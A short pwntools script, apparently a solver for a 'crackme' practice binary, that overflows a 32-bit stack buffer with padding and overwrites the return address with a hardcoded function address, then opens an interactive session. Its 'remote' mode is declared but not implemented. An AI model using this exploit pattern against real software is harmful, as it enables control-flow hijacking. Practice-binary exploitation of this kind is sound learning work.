from pwn import *
import argparse
import os

# ==========================================
# CONFIGURATION
# ==========================================

# File executable target

exe = "./crackme" 
elf = ELF(exe)
context.binary = elf
context.arch = elf.arch
context.log_level = "info"

# ==========================================
# ARGUMENT PARSER
# ==========================================

parser = argparse.ArgumentParser(
    description="Pwntools Solver"
)

parser.add_argument(
    "mode",
    choices=["local", "remote"],
    help="Execution mode"
)

args = parser.parse_args()

# ==========================================
# CONNECTION
# ==========================================

def start():

    if args.mode == "local":

        log.info("Starting local process")

        return process(exe)

# ==========================================
# EXPLOIT / SOLVER
# ==========================================

def exploit(io):
    
    offset = cyclic_find(0x6161616c)
    s_func_address = 0x08049182

    payload = b'A' * offset
    payload += p32(s_func_address)

    io.sendline(payload)

    res = io.recv(timeout=2)
    print(res)

    io.interactive()

# ==========================================
# MAIN
# ==========================================

def main():

    io = start()

    exploit(io)
    
    io.interactive()


if __name__ == "__main__":
    main()
